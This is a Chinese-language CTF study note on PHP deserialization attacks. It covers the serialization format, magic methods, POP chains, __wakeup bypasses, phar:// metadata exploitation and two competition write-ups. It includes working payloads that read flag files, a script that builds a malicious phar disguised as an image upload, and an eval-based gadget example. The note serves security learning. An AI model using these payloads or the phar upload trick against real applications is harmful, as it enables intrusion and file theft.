# 反序列化专题（PHP Deserialization）

> **一句话:应用把用户可控的字符串丢进 `unserialize()`,而反序列化会**触发魔术方法**,
> 于是你能让代码按你的意思执行。**

---

## 一、先认识序列化格式

**PHP 的 `serialize()` 把变量变成字符串,`unserialize()` 再变回来。**

### 各种类型长什么样

| 类型 | 格式 | 例子 |
|---|---|---|
| **整数** | `i:值;` | `i:123;` |
| **浮点** | `d:值;` | `d:1.5;` |
| **布尔** | `b:0/1;` | `b:1;` |
| **字符串** | `s:长度:"内容";` | `s:5:"hello";` |
| **数组** | `a:元素个数:{键值对}` | `a:2:{i:0;s:1:"a";i:1;s:1:"b";}` |
| **对象** | `O:类名长:"类名":属性数:{...}` | `O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}` |
| **NULL** | `N;` | `N;` |

### 一个对象拆开看

```php
class Flag { public $file = "flag.php"; }
serialize(new Flag());
```

```text
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
│ │  │      │  └────────────┬────────────┘
│ │  │      │          属性名 + 属性值
│ │  │      └── 属性个数 = 1
│ │  └── 类名长度 = 4
│ └── O = object
└── 类型前缀
```

!!! warning "三个数字必须全对"

    ```
    O:4:"Flag"   ← 4 = 类名字符数
    :1:          ← 1 = 属性个数
    s:8:"flag.php"  ← 8 = 字符串长度
    ```

    **任何一个对不上,`unserialize()` 直接失败(返回 false,通常静默)。**
    这也是自己手写 payload 最常见的错。

## 二、漏洞是怎么产生的

```php
$data = $_GET['data'];
$obj = unserialize($data);     // ← 危险点
echo $obj;                     // ← 或者任何后续操作
```

**光 `unserialize` 还不一定能打,关键是**有没有魔术方法被触发**。**

### 触发链的本质

```text
你给的字符串
   ↓ unserialize
构造出一个对象(属性全由你控制)         ← 第一步:控制属性
   ↓ 后续代码对它的操作
某个魔术方法被调用                      ← 第二步:触发方法
   ↓ 方法里用了你控制的属性
敏感操作(读写文件 / 执行命令 / 发起请求)  ← 第三步:达成目的
```

**这三步连起来就是「POP 链」(Property-Oriented Programming)。**

---

## 三、魔术方法速查表

| 方法 | 什么时候被调用 |
|---|---|
| `__construct()` | `new` 一个对象时 |
| `__destruct()` | 对象被销毁(脚本结束、unset)时 |
| **`__wakeup()`** | **`unserialize()` 之后立刻** |
| `__sleep()` | `serialize()` 之前 |
| **`__toString()`** | **对象被当字符串用**(`echo`、拼接)时 |
| `__invoke()` | 对象被当函数调用 `$obj()` 时 |
| `__get($name)` | 读不可访问/不存在的属性时 |
| `__set($name,$v)` | 写不可访问属性时 |
| `__isset()` | 对不可访问属性用 `isset()` |
| `__unset()` | 对不可访问属性用 `unset()` |
| `__call($n,$a)` | 调用不存在的方法时 |
| `__callStatic()` | 静态调用不存在的方法时 |
| `__clone()` | `clone` 时 |

**做题时先搜这几个名字,找到它们内部干了什么。**

## 四、怎么构造 payload

### 最稳的办法:本地生成

**别手写序列化串,写个 PHP 脚本 `serialize()` 出来:**

```php
<?php
class Flag { public $file = "/flag"; }
$a = new Flag();
echo serialize($a);          // O:4:"Flag":1:{s:4:"file";s:5:"/flag";}
```

**本机有 PHP 就跑一下(`E:\dsh\tools\php74\php.exe`),没有就按格式手写。**

### 属性可见性:三种写法完全不同 ⚠️

| 声明 | 序列化后的属性名 |
|---|---|
| `public $file` | `file` |
| `protected $file` | `\0*\0file`(`*` 两侧各有一个 NUL) |
| `private $file` | `\0Flag\0file`(`\0` + 类名 + `\0` + 属性名) |

**`\0` 是不可见字符,手写时极易出错。**

**URL 里要写成 `%00`:**

```text
O:4:"Flag":1:{s:7:"%00*%00file";s:5:"/flag";}
```

**注意这时长度要按真实字节数算(`\0` 算 1 字节):`\0*\0file` 是 7 字节。**

### 生成的 payload 要 URL 编码

**序列化串里有 `"` `{` `}` `;`,直接放 URL 会被截断。建议全编码:**

```text
O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D
```

## 五、四种常见绕过

### ① 绕过 `__wakeup()`

**如果 `__wakeup` 里做了检查(比如 `die`),可以让它**不被调用**:**

```text
O:4:"Flag":2:{s:4:"file";s:8:"flag.php";}
          ↑
    把属性个数改得比真实的多
```

**PHP < 5.6.25 / 7.0.10 有这个 bug(CVE-2016-7124):属性数大于真实数时,`__wakeup` 被跳过。**

### ② 长度不一致

**`s:8:"flag.php"` 里的 8 必须对。** 有些场景可以利用长度错位吃掉后面的字符(如 `s:5:"abc";}`)。

### ③ 大写 `S` 转义

**`s` 有对应的大写形式 `S`,允许十六进制转义:**

```text
S:5:"\61\62\63\64\65"       ← 等价于 s:5:"abcde"
```

**用来绕过对特定字符串的正则匹配。**

### ④ 引用 `&`

```text
a:2:{i:0;s:4:"test";i:1;R:2;}
```

**`R:2` 表示引用第 2 个元素 —— 可以让两个属性指向同一个值。**

## 六、phar 反序列化(不需要 `unserialize`)

**这是最容易被忽略的一种。**

**只要代码里出现了 `phar://` 协议的文件操作,就会触发 phar 内部元数据的反序列化:**

```php
file_exists("phar://uploads/avatar.jpg/test.txt");
```

**哪怕只是 `file_exists` / `filesize` / `getimagesize`,也会触发。**

**条件:**

```
① 有一个 phar 文件(通常靠文件上传)
② 代码里能控制到 phar:// 的路径
③ 有可用的魔术方法链
```

**生成 phar 需要 `phar.readonly=Off`:**

```php
$p = new Phar("evil.phar");
$p->startBuffering();
$p["test.txt"] = "x";                 // 随便一个文件
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->setMetadata(new Flag());          // ← 这里放对象,序列化后存进 phar
$p->stopBuffering();
```

**把 `evil.phar` 改名成 `.jpg` 上传,再用 `phar://` 引用即可。**

**⚠️ PHP 8.0 之后,phar:// 的反序列化被限制了很多场景。**

## 七、POP 链怎么找

**在一道题里,通常是:**

```text
① 搜 unserialize —— 找到入口
② 看入口附近的类有哪些魔术方法
③ 从魔术方法内部读:它调用了什么属性/方法
④ 一层层往下追,直到找到危险操作
⑤ 反向拼出对象嵌套
```

**危险操作(链尾)通常是:**

```
file_get_contents / file_put_contents / unlink / system / eval / call_user_func
```

**一个最小的链长这样:**

```php
class A { public $cmd;  function __destruct() { eval($this->cmd); } }
```

```text
O:1:"A":1:{s:3:"cmd";s:6:"phpinfo";}
```

**`__destruct` 在脚本结束时自动触发 → 不需要额外操作。**

## 八、其他语言

| 语言 | 格式 | 工具 |
|---|---|---|
| **PHP** | `O:4:"Flag":...` | phpggc(框架链)、手写 |
| **Java** | `aced0005...`(二进制) | ysoserial |
| **Python** | `pickle` 字节流 | 手写 `__reduce__` |
| **Node.js** | JSON | `node-serialize` 的 `_$$ND_FUNC$$_` |

**原理完全一样:序列化数据里带了「类型信息」,反序列化时按类型重建对象 → 触发构造函数/魔术方法。**

### 9.1 ✅ [ZJCTF 2019] NiZhuanSiWei —— 第三层

**入口:**

```php
$password = unserialize($password);
echo $password;              // ← 关键:echo 把对象当字符串 → 触发 __toString
```

**`useless.php` 里的类:**

```php
class Flag {
    public $file;
    public function __tostring() {
        if (isset($this->file)) {
            echo file_get_contents($this->file);
            echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
```

**分析:**

```
① 属性 $file 完全由我们控制
② echo $password 触发 __tostring
③ __tostring 里 file_get_contents($this->file)
④ 所以要序列化一个 file 指向 flag 的 Flag 对象
```

**payload:**

```text
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

**对应 WP:[/blog/zjctf-nizhuansiwei/](../../blog/posts/2026-10-23-zjctf-nizhuansiwei.md)**

**这题只用到一层,是最干净的反序列化入门。**

### 9.2 ✅ [极客大挑战 2019] PHP —— `__wakeup` 绕过

**入口:**

```php
include 'class.php';
$select = $_GET['select'];
$res = unserialize(@$select);
```

**类:**

```php
class Name {
    private $username = 'nonono';
    private $password = 'yesyes';

    function __wakeup(){ $this->username = 'guest'; }   // ← 后门:反序列化后强制改名

    function __destruct(){
        if ($this->password != 100) { echo "NO!!!hacker!!!"; die(); }
        if ($this->username === 'admin') { global $flag; echo $flag; }
    }
}
```

**分析:**

```
① 目标是 username === 'admin' 且 password == 100
② 但 __wakeup 会把 username 改成 guest
③ 必须让 __wakeup 不执行
```

**payload:**

```text
O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
              └───────── 14 字节 ─────────┘
```

**两个细节:**

| 细节 | 说明 |
|---|---|
| **属性数写 3**（实际只有 2 个） | `__wakeup` 被跳过（CVE-2016-7124，PHP < 5.6.25 / 7.0.10） |
| **`private` 属性名带 `\0`** | `\0Name\0username` = 14 字节；URL 里写 `%00` |

**⚠️ 新版 PHP 上 `:3:` 不是跳过 `__wakeup`，而是整个包**解析失败**。这题只在老版本环境成立。**

→ 详见 WP：[/blog/geek2019-php/](../../blog/posts/2026-10-24-geek2019-php.md)

## 十、我踩的坑

> 打的过程中往里填。格式:**现象 → 原因 → 正确做法**。

### 坑 1:属性个数 / 字符串长度写错

**现象:页面空白,什么都没发生。**

**原因:序列化串里 `O:4:` 后面的 `4` 或 `s:8:` 后面的 `8` 对不上,`unserialize` 静默返回 false。**

**做法:改完 payload 一定数一遍长度;能用本地 `serialize()` 生成就别手写。**

### 坑 2:private / protected 属性写成 public 的格式

**现象:`__tostring` 不触发,或者属性读不到。**

**原因:`private $file` 序列化后是 `\0Flag\0file`,不是 `file`。**

**做法:本地 `var_dump(serialize($obj))` 看一眼原始字节。**

### 坑 3:URL 里忘了编码

**现象:payload 被截断,只有前半截。**

**原因:`{` `}` `;` `"` 在 URL 里有特殊含义。**

**做法:整条 URL 编码,或至少编码 `{ } ; "`。**

### 坑 4:以为 `unserialize` 就一定触发 `__construct`

**不会。`unserialize` 触发的是 `__wakeup`,**不是 `__construct`**。**

**`__construct` 只在 `new` 时调用。**

---

## 十一、一句话总结

> **反序列化 = 用字符串重建对象,属性值全由你控制。**
>
> **找洞三步:哪里 `unserialize` → 哪个魔术方法会被触发 → 方法里用了哪个属性。**
>
> **构造方式:本地写 PHP `serialize()` 生成,别手写。**
>
> **没有 `unserialize` 也别放弃 —— `phar://` 一样能触发。**
